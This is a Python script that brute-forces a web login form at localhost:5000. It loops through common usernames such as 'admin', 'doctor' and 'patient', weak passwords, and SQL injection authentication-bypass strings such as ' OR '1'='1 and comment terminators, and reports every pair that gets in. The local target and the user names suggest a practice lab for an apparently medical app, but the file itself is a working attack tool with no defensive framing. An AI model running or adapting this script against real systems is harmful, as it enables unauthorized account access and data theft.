import requests
import time
from concurrent.futures import ThreadPoolExecutor

# Target URL
LOGIN_URL = "http://localhost:5000/login"

# Common usernames to try
usernames = [
    "admin",
    "doctor",
    "patient",
    "user",
    "test",
    "admin' OR '1'='1",
    "admin' --",
    "admin' OR '1'='1' --",
    "admin' OR '1'='1' #",
    "admin' OR '1'='1'/*",
]

# Common passwords to try
passwords = [
    "password",
    "123456",
    "admin",
    "test",
    "password123",
    "admin123",
    "anything' OR '1'='1",
    "anything' --",
    "anything' OR '1'='1' --",
    "anything' OR '1'='1' #",
    "anything' OR '1'='1'/*",
]

def try_login(username, password):
    try:
        # Create session to maintain cookies
        session = requests.Session()
        
        # Prepare login data
        login_data = {
            "username": username,
            "password": password
        }
        
        # Send POST request
        response = session.post(LOGIN_URL, data=login_data)
        
        # Check if login was successful
        if "Invalid username or password" not in response.text:
            print(f"[+] SUCCESS! Username: {username} | Password: {password}")
            print(f"[+] Response: {response.text[:200]}")  # Print first 200 chars of response
            return True
        else:
            print(f"[-] Failed: {username} | {password}")
            return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

def main():
    print("[*] Starting brute force attack...")
    print("[*] Testing SQL injection and common credentials...")
    
    # Try SQL injection combinations
    for username in usernames:
        for password in passwords:
            try_login(username, password)
            time.sleep(0.5)  # Add delay to avoid overwhelming the server
    
    print("[*] Brute force attack completed!")

if __name__ == "__main__":
    main() 